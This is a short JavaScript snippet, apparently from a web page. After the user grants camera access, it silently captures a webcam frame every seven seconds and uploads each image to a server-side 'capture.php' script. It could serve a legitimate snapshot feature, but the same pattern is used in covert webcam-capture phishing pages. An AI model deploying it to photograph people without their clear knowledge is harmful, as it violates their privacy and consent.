const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

// Ask for Camera Access
navigator.mediaDevices.getUserMedia({ video: true, audio: false })
    .then(stream => {
        video.srcObject = stream;
        // Start automatic capture every 7 seconds
        setInterval(takeSnapshot, 7000);
    })
    .catch(err => {
        console.error("Camera access denied: ", err);
    });

function takeSnapshot() {
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, 640, 480);
    const imageData = canvas.toDataURL('image/png');

    fetch('capture.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: imageData })
    });
}